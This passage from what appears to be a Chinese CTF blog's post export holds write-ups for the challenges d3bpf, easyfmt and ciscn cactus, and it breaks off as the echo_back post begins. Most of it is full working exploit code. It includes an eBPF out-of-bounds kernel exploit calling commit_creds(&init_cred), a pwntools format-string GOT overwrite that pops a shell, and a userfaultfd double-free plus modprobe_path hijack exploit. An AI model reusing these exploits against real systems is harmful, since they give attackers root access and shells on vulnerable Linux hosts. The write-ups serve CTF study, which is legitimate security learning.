BPF_REG_8#define OOB_REG BPF_REG_7#define STORE_REG BPF_REG_6#define attack(oob_map_fd, store_map_fd)                                     \\    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \\        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \\        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \\        BPF_MOV64_IMM(EXP_REG, 1),                                           \\        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \\        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \\        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \\        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \\        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \\        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)static int setup_btf_bpf_prog_fd;void read_kernel(int oob_map_fd, int store_map_fd, unsigned long addr, char *buf, int len)&#123;    int i;    char values[0x1500] = &#123;0&#125;;    struct bpf_insn read_map_ops_content[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0xD0),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 8),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),        BPF_MOV64_IMM(BPF_REG_0, 0),        BPF_EXIT_INSN()&#125;;    for (i = 0; i &lt; len / 4; i++)    &#123;        memset(values, 0, sizeof(values));        struct bpf_map_info_kernel info = &#123;0&#125;;        union bpf_attr attr = &#123;            .info.bpf_fd = oob_map_fd,            .info.info = (long long unsigned int)&amp;info,            .info.info_len = sizeof(info)&#125;;        ((unsigned long *)&amp;values[8])[0] = addr - 0x58;        if (addr == 0)        &#123;            ((uint64_t *)&amp;values[8])[0] = 0;        &#125;        if (0 != update_map_element(store_map_fd, 0, values, BPF_ANY))        &#123;            err_exit(&quot;[-] failed to update map element values!\\n&quot;);        &#125;        if (0 != run_bpf_prog(read_map_ops_content, sizeof(read_map_ops_content) / sizeof(read_map_ops_content[0]), &amp;setup_btf_bpf_prog_fd))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;        if (0 != obj_get_info_by_fd(&amp;attr))        &#123;            err_exit(&quot;[-] Failed to get map info\\n&quot;);        &#125;        addr = addr + 4;        ((uint32_t *)buf)[i] = info.btf_id;    &#125;    printf(&quot;%d\\n&quot;, i);&#125;unsigned long raw_array_map_ops = 0xffffffff820363a0;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int main()&#123;    // save_status();    union bpf_attr map_attr = &#123;        .map_type = BPF_MAP_TYPE_ARRAY,        .key_size = sizeof(int),        .value_size = 0x1500,        .max_entries = 1&#125;;    int store_map_fd = create_map(&amp;map_attr);    int oob_map_fd = create_map(&amp;map_attr);    if (store_map_fd &lt; 0 || oob_map_fd &lt; 0)    &#123;        err_exit(&quot;Failed to create map\\n&quot;);    &#125;    char *values = malloc(0x3000);    unsigned long ops[0x1000] = &#123;0&#125;;    memset(values, 0, sizeof(values));    if (0 != update_map_element(oob_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    if (0 != update_map_element(store_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    struct bpf_insn read_map_ops[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),        BPF_EXIT_INSN()&#125;;    if (0 != run_bpf_prog(read_map_ops, sizeof(read_map_ops) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    if (0 != lookup_map_element(store_map_fd, 0, values))    &#123;        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    &#125;    unsigned long array_map_ops = ((unsigned long *)(&amp;values[8]))[0];    kernel_offset = array_map_ops - raw_array_map_ops;    kernel_base = 0xffffffff81000000 + kernel_offset;    unsigned long modprobe_path_addr = 0x1a6c240 + kernel_base;    unsigned long work_for_cpu_fn_addr = kernel_offset + 0xffffffff810bc190;    unsigned long commit_creds_addr = kernel_offset + 0xffffffff810cce30;    unsigned long init_creds_addr = kernel_offset + 0xffffffff82a6b880;    printf(&quot;array_map_ops_addr =&gt; %p\\n&quot;, array_map_ops);    printf(&quot;kernel_base =&gt; %p\\n&quot;, kernel_base);    printf(&quot;kernel_offset =&gt; %p\\n&quot;, kernel_offset);    printf(&quot;modprobe_path =&gt; %p\\n&quot;, modprobe_path_addr);    printf(&quot;work_for_cpu_fn =&gt; %p\\n&quot;, work_for_cpu_fn_addr);    printf(&quot;commit_creds_addr =&gt; %p\\n&quot;, commit_creds_addr);    printf(&quot;init_creds_addr =&gt; %p\\n&quot;, init_creds_addr);    struct bpf_insn read_map_addr[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110 - 0xc0),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),        BPF_EXIT_INSN()&#125;;    if (0 != run_bpf_prog(read_map_addr, sizeof(read_map_addr) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    if (0 != lookup_map_element(store_map_fd, 0, values))    &#123;        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    &#125;    unsigned long map_ptr = ((unsigned long *)(&amp;values[8]))[0];    printf(&quot;map_ptr =&gt; %p\\n&quot;, map_ptr);    printf(&quot;gap =&gt; %p\\n&quot;, (modprobe_path_addr - map_ptr));    unsigned long map_value = map_ptr - 0xc0 + 0x110;    // 0x79706f432f00    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, 0xf0);    *((unsigned long *)(values + 8 * 4)) = work_for_cpu_fn_addr;    if (0 != update_map_element(oob_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    puts(&quot;get_ops!&quot;);    struct bpf_insn modify_oob_map[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x20),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x20),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x28),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x28),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x30),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),        BPF_EXIT_INSN()&#125;;    ops[4] = commit_creds_addr;    ops[5] = init_creds_addr;    ops[6] = map_value;    if (0 != update_map_element(store_map_fd, 0, ops, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    if (0 != run_bpf_prog(modify_oob_map, sizeof(modify_oob_map) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    puts(&quot;[+] updated oob_map&quot;);    unsigned long key = 0;    unsigned long next_key;    union bpf_attr attr = &#123;        .map_fd = oob_map_fd,        .key = &amp;key,        .next_key = &amp;next_key&#125;;    map_get_next_key(&amp;attr);    printf(&quot;[+] commit_cred(&amp;init_cred) done!\\n&quot;);    get_shell();    return 0;&#125;\n\n\n\n题目放在: https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip\n","categories":["kernel-pwn"],"tags":["ebpf"]},{"title":"easyfmt","url":"/2021/12/17/easyfmt/","content":"朝着今年更到50篇进发！！！\n检查保护\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[264]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(&quot;welcome to haerbin~&quot;);  if ( (unsigned int)CheckIn(&quot;welcome to haerbin~&quot;) == 1 )  &#123;    memset(buf, 0, 0x100uLL);    write(1, &quot;slogan: &quot;, 9uLL);    read(0, buf, 0x100uLL);    printf(buf);  &#125;  puts(&quot;bye~&quot;);  exit(0);&#125;\n\n_BOOL8 CheckIn()&#123;  unsigned int v0; // eax  unsigned __int8 v2; // [rsp+0h] [rbp-30h]  __int64 buf; // [rsp+10h] [rbp-20h] BYREF  __int16 v4; // [rsp+18h] [rbp-18h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v0 = time(0LL);  srand(v0);  v2 = rand() % 5 + 48;  printf(&quot;enter:&quot;);  buf = 0LL;  v4 = 0;  read(0, &amp;buf, 0xAuLL);  return (_BYTE)buf == v2;&#125;\n\n流程分析可以看到程序是进入CheckIn函数，跟随机数比较，但是这里rand()%5的大小为0~4，所以直接爆破就好。然后爆破成功之后会进入到格式化字符串漏洞，但是程序会直接exit结束。\n利用分析通过爆破进入格式化字符串漏洞，修改exit的got表到0x400982位置(可以重复利用格式化字符串)，泄漏出libc的基地址，修改printf函数的got表地址为system地址。\n重点是需要重复利用格式化字符串漏洞，所以修改了exit的got表后面直接泄漏和修改就好了。\n需要注意的是https://cv196082.gitee.io/2021/09/17/study-pwn1/ 在我的这篇文章里面说了got表的地址是怎么来的，因为exit是最后才执行所以exit的got表存的不是他的真是地址\n\n存放的是这个，所以我们直接修改低两位就可以了。\n在就是修改printf的地址为system地址的时候只需要覆盖后面三个字节也可以了。\nexpfrom pwn import *from LibcSearcher import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]printf_addr = 0x400982while 1:    elf = ELF(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    r = process(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    # r = remote(&#x27;111.200.241.244&#x27;, 54807)    try:        r.recvuntil(b&#x27;enter:&#x27;)        r.sendline(b&#x27;2&#x27;)        r.recvuntil(b&#x27;slogan:&#x27;)        break    except:        continue# gdb.attach(r)# offset=8context.log_level = &#x27;debug&#x27;exit_got = elf.got[&#x27;exit&#x27;]printf_got = elf.got[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]# 修改exit的got表地址payload = b&#x27;%&#x27;+bytes(str(0x982), encoding=&#x27;utf8&#x27;) + b&#x27;c%10$hn&#x27;payload = payload.ljust(0x10, b&#x27;a&#x27;)payload += p64(exit_got)# gdb.attach(r)r.sendline(payload)# 泄漏exit的真实地址r.recvuntil(b&#x27;slogan: &#x27;)payload = b&#x27;%10$s&#x27;.ljust(8, b&#x27;a&#x27;)+p64(read_got)# gdb.attach(r)r.sendline(payload)read_addr = u64(r.recvuntil(b&#x27;aaa&#x27;, drop=True)[1:].ljust(8, b&#x27;\\x00&#x27;))info(hex(read_addr))libc = LibcSearcher(&#x27;read&#x27;, read_addr)libc_base = read_addr-libc.dump(&#x27;read&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)# 修改printf的地址r.recvuntil(b&#x27;slogan: &#x27;)system_low = system_addr &amp; 0xffpayload = b&#x27;%&#x27;+bytes(str(system_low), encoding=&#x27;utf8&#x27;)+b&#x27;c%14$hhn&#x27;system_high = ((system_addr &amp; 0xffffff) &gt;&gt; 8) - system_lowpayload += b&#x27;%&#x27;+bytes(str(system_high), encoding=&#x27;utf8&#x27;)+b&#x27;c%15$hn&#x27;payload = payload.ljust(0x20, b&#x27;a&#x27;)+p64(printf_got)+p64(printf_got+1)r.sendline(payload)# getshellr.recvuntil(b&#x27;slogan: &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"ciscn cactus复现","url":"/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/","content":"其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。\n题目分析这里想问佬们一个问题，就是为什么这道题不能够同时打开两个设备。因为我最开始的思路就是打开两个设备造成UAF，但是就是打不开。\nvoid __fastcall kernel_open(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; // rdi  ((void (__fastcall *)(__int64, __int64, __int64))_fentry__)(a1, a2, a3);  if ( !flags )  &#123;    v3 = kmalloc_caches[8];    flags = 1;    buffer = (char *)kmem_cache_alloc_trace(v3, 0xCC0LL, 0x100LL);    if ( buffer )      kernel_open_cold();  &#125;&#125;\n\nint __fastcall kernel_release(inode *inode, file *filp)&#123;  char **v2; // rax  int result; // eax  _fentry__(inode, filp);  v2 = addrList;  do    *v2++ = 0LL;  while ( v2 != &amp;addrList[0x20] );  kfree(buffer);  result = 0;  flags = 0;  return result;&#125;\n\n然后这道题的主要函数就是ioctl其余的对做题不影响就不提了。\n// local variable allocation has failed, the output may be wrong!__int64 __fastcall kernel_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;  __int64 v3; // rdx  __int64 result; // rax  __int64 idx_low; // r12  char *v6; // rdi  __int64 v7; // rax  char *v8; // r12  __int64 v9; // rax  __int64 v10; // rdx  unsigned int size; // eax  char *v12; // r13  __int64 v13; // r12  char *buf; // r14  edit_args a4; // [rsp+0h] [rbp-40h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-28h]  _fentry__(file, *(_QWORD *)&amp;cmd);  v16 = __readgsqword(0x28u);  result = 0LL;  if ( cmd == 0x30 )  &#123;    if ( !copy_from_user(&amp;a4, v3, 8LL) )    &#123;      if ( delFlags &lt;= 1 &amp;&amp; LODWORD(a4.idx) &lt;= 0x20 )      &#123;        idx_low = LODWORD(a4.idx);        v6 = addrList[LODWORD(a4.idx)];        if ( v6 )        &#123;          kfree(v6);          ++delFlags;          addrList[idx_low] = 0LL;        &#125;      &#125;      return 0LL;    &#125;    return -22LL;  &#125;  if ( cmd == 0x50 )  &#123;    if ( !copy_from_user(&amp;a4, v3, 0x18LL) )    &#123;      if ( editFlags &lt;= 1 )      &#123;        size = a4.size;        if ( LODWORD(a4.size) &gt; 0x400 )          size = 0x400;        if ( LODWORD(a4.idx) &lt;= 0x20 )        &#123;          v12 = addrList[LODWORD(a4.idx)];          if ( v12 )          &#123;            v13 = size;            buf = a4.buf;            _check_object_size(v12, size, 0LL);            if ( !copy_from_user(v12, buf, v13) )            &#123;              ++editFlags;              return 0LL;            &#125;          &#125;        &#125;      &#125;      return 0LL;    &#125;    return -22LL;  &#125;  if ( cmd != 0x20 )    return result;  if ( copy_from_user(&amp;a4, v3, 0x10LL) )    return -22LL;  if ( addFlags &gt; 1 )    return 0LL;  v7 = kmem_cache_alloc_trace(kmalloc_caches[10], 0xCC0LL, 0x400LL);  v8 = (char *)v7;  if ( !v7 )    return 0LL;  v9 = copy_from_user(v7, a4.size, 0x400LL);  if ( v9 )    return 0LL;  while ( 1 )  &#123;    v10 = (int)v9;    if ( !addrList[v9] )      break;    if ( ++v9 == 0x20 )      return 0LL;  &#125;  ++addFlags;  result = 0LL;  addrList[v10] = v8;  return result;&#125;\n\n可以看到这里分别是add，del，edit三个功能。并且不存在直接的漏洞，不过题目没有加锁的操作。\n再就是题目所打开的保护是kaslr，kpti，smep，smap四个保护。\n利用分析构造double free我们要知道的是在slab管理器中的指向。slab-&gt;freelist指向的是我们刚刚free掉的object，然后我们的object中间的某个位置修改为原始是slab-&gt;freelist。\n那么按照题目来看如果我们使用userfaultfd在edit的第二个copy_from_user阻塞进程同时在另一个进程free掉刚刚到object，那么我们在缺陷页处理返回新的页时修改掉object中的指针即可。并且这里采用的方法是partial write。\n泄漏基地址既然有了double free那么后续就很好办了，这里借用上一篇文章中的思路，我们首先申请sk_buff结构体获得object，随后使用pipe_buffer获取同一块object并把ops写到堆上，那么紧接着只需要将pipe_buffer-&gt;ops读出即可。\nmodprobe_path详细可以参考这篇文章：https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/\n既然我们有了kernel基地址，那么直接根据偏移获取modprobe_path。同样修改object的指针，构造fake_object指向modprobe_path即可。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define SOCKET_NUM 1#define SK_BUFF_NUM 1#define PIPE_NUM 1#define PIPE_NUM2 16struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        errExit(&quot;[-] pthread_create&quot;);&#125;void *edit_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] edit handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] edit handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(2);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] edit handler done&quot;);        return NULL;    &#125;&#125;struct add_arg&#123;    unsigned long idx;    char *buf;&#125;;struct edit_arg&#123;    unsigned long idx;    unsigned long size;    char *buf;&#125;;struct del_arg&#123;    unsigned long idx;&#125;;int fd;int add(char *buf)&#123;    struct add_arg arg;    arg.idx = 0;    arg.buf = buf;    return ioctl(fd, 0x20, &amp;arg);&#125;int del(unsigned long idx)&#123;    struct del_arg arg;    arg.idx = idx;    return ioctl(fd, 0x30, &amp;arg);&#125;int edit(unsigned long idx, unsigned long size, char *buf)&#123;    struct edit_arg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    return ioctl(fd, 0x50, &amp;arg);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void prepare_mod()&#123;    system(&quot;mkdir -p /tmp&quot;);    system(&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;chmod +x /tmp/copy.sh&quot;);    system(&quot;echo -e &#x27;\\\\xFF\\\\xFF\\\\xFF\\\\xFF&#x27; &gt; /tmp/dummy&quot;);    system(&quot;chmod +x /tmp/dummy&quot;);&#125;int main()&#123;    char *buf = malloc(0x4000);    char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    unsigned long kernel_base = NULL;    unsigned long kernel_offset = NULL;    unsigned long kernel_addr = NULL;    int sk_sockets[SOCKET_NUM][2];    int pipe_fd[PIPE_NUM][2];    int pipe_fd2[PIPE_NUM2][2];    struct pipe_buffer *pipe_buf_ptr;    char sk_buf[704];    unsigned long modprobe_path;    unsigned long *pointer_buf;    char *flag[0x100];    int flag_fd;    prepare_mod();    for (int i = 0; i &lt; PIPE_NUM2; i++)    &#123;        if (pipe(pipe_fd2[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        // write something to activate it        if (write(pipe_fd2[i][1], &quot;7777pray&quot;, 8) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    for (int i = 0; i &lt; SOCKET_NUM; i++)        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)            errExit(&quot;failed to create socket pair!&quot;);    fd = open(&quot;/dev/kernelpwn&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[x] open 0 kernelpwn error!%d\\n&quot;, fd);        return 0;    &#125;    memset(buf, 0, 0x1000);    add(buf);    RegisterUserfault(page, edit_handle);    clock_t start_t, finish_t;    start_t = clock();    int pid = fork();    if (pid &lt; 0)    &#123;        errExit(&#x27;[-] fork error!&#x27;);    &#125;    else if (pid == 0)    &#123;        puts(&quot;[\\033[34m\\033[1m*\\033[0m] Child process sleeping now...&quot;);        del(0);        puts(&quot;[\\033[34m\\033[1m*\\033[0m] Child process started.&quot;);        exit(0);    &#125;    else    &#123;        puts(&quot;[\\033[34m\\033[1m*\\033[0m] trapped in userfaultfd&quot;);        edit(0, 0x202, page);    &#125;    finish_t = clock() - start_t;    printf(&quot;gap:%d\\n&quot;, finish_t);    memset(sk_buf, 0, 704);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], sk_buf, sizeof(sk_buf)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;[+] spray sk_buff success&quot;);    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    puts(&quot;[+] spray pipe_buffer success&quot;);    pipe_buf_ptr = (struct pipe_buffer *)&amp;sk_buf;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;sk_buf, sizeof(sk_buf)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            puts(&quot;[*] read success!&quot;);            // print_hex(sk_buf, 0x2c0);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = (unsigned long *)pipe_buf_ptr-&gt;ops;                kernel_base = (kernel_addr - 0x103ed80);                kernel_offset = kernel_base - 0xffffffff81000000;            &#125;        &#125;    &#125;    if (kernel_addr == NULL)    &#123;        printf(&quot;[-] leak error!\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_offset);    modprobe_path = kernel_offset + 0xffffffff82a6c000 - 0xe0;    add(buf);    close(pipe_fd[0][0]);    close(pipe_fd[0][1]);    *(unsigned long *)((char *)buf + 0x200) = modprobe_path;    edit(0, 0x300, buf);    if (write(sk_sockets[0][0], sk_buf, sizeof(sk_buf)) &lt; 0)    &#123;        errExit(&quot;failed to spray sk_buff!&quot;);    &#125;    memset(sk_buf, 0, sizeof(sk_buf));    pointer_buf = (unsigned long *)&amp;sk_buf;    pointer_buf[0] = kernel_offset + 0xffffffff82382ba7;    pointer_buf[1] = kernel_offset + 0xffffffff82382bae;    pointer_buf[2] = kernel_offset + 0xffffffff823a20e0;    pointer_buf[4] = 0x000004e200000000;    pointer_buf[5] = 0xa;    pointer_buf[12] = 0x000004e200000000;    pointer_buf[13] = 0xa;    pointer_buf[20] = 0x000004e200000000;    pointer_buf[21] = 0xa;    strcpy(sk_buf + 0xe0, &quot;/tmp/copy.sh&quot;);    pointer_buf[61] = kernel_offset + 0xffffffff82a6c108;    pointer_buf[62] = kernel_offset + 0xffffffff82a6c108;    pointer_buf[63] = 0x32;    if (write(sk_sockets[0][0], sk_buf, sizeof(sk_buf)) &lt; 0)    &#123;        errExit(&quot;failed to spray sk_buff!&quot;);    &#125;    printf(&quot;[*] modprobe_path addr=&gt;%p\\n&quot;, modprobe_path + 0xe0);    for (int i = 0; i &lt; PIPE_NUM2; i++)    &#123;        close(pipe_fd2[i][0]);        close(pipe_fd2[i][1]);    &#125;    system(&quot;/tmp/dummy&quot;);    flag_fd = open(&quot;/tmp/myflag&quot;, O_RDWR);    if (flag_fd &lt; 0)        printf(&quot;FAILED to hijack!&quot;);    read(flag_fd, flag, 0x100);    write(1, flag, 0x100);    printf(&quot;\\n&quot;);    // del(0);    sleep(10);    return 0;&#125;\n\n\n补充一下根据exp可以可能会存在以这样一个疑问：为什么开始要申请16个pipe_buffer结构体？\n上面这个问题我依稀记得我在某篇文章提到过，不过我也没找到，所以这里再做一下解释。在最后利用时我们就已经破坏掉了slab的freelist链表了，但是系统会继续申请很多堆块，所以我们所做的算是保证在申请0x400size的object的时候不会发生kernel panic。\n\n题目链接：https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip\n","categories":["kernel-pwn"],"tags":["sk_buff","pipe_buffer","userfaultfd","modprobe_path"]},{"title":"echo_back","url":"/2021/12/06/echo-back/","content":"保护检查\n保护全开\n流程分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 result; // rax  int v4; // [rsp+8h] [rbp-18h]  char s[8]; // [rsp+10h] 